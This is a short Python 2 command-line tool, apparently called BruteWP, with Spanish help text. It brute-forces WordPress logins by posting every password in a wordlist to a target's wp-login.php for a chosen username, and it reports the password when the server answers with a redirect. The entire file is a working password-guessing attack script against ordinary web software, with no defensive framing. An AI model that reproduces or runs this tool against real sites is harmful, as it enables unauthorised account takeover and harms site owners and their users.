#!/usr/bin/python
#-*- coding:UTF-8 -*-
import argparse
import httplib
import urllib

def attack(target,user,wordlist):
    i= target.find("/")
    site = target[:i]
    post = target[i:]
    cont = 0
    for password in open(wordlist,'r'):
        parametros = urllib.urlencode({'log': user,'pwd':password.strip()})
        cabeceras = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
        abrir_conexion = httplib.HTTPConnection(site)
        abrir_conexion.request("POST", post, parametros, cabeceras)
        cont+=1
        respuesta = abrir_conexion.getresponse()
        if respuesta.status == 302:
            print '%d- Password: %s FOUND!!!' %(cont,password.strip())
            break
        elif respuesta.status == 200:
            print '%d- Password: %s Not found!!!' %(cont,password.strip())
        else:
            print 'ERROR!!!!'
 
def conexion():
    parser = argparse.ArgumentParser(usage="./BruteWP.py -t [target] -u [user] -w [wordlist]")
    parser.add_argument("-t", help="Target a atacar. ejemplo: www.sitewordpress/wp-login.php")
    parser.add_argument("-u", help="Nombre de usuario de WordPress")
    parser.add_argument("-w", help="Diccionario para realizar el ataque")
    args = parser.parse_args()
    
    print """
 ____             _     __        ______  
| __ ) _ __ _   _| |_ __\ \      / /  _ \ 
|  _ \| '__| | | | __/ _ \ \ /\ / /| |_) |
| |_) | |  | |_| | ||  __/\ V  V / |  __/ 
|____/|_|   \__,_|\__\___| \_/\_/  |_|    
                                        v 1.0
    """
    if args.u != None and args.w != None and args.t != None:
        attack(args.t,args.u,args.w)
    else:
        parser.print_help()
    


if __name__ == '__main__':
    conexion()
    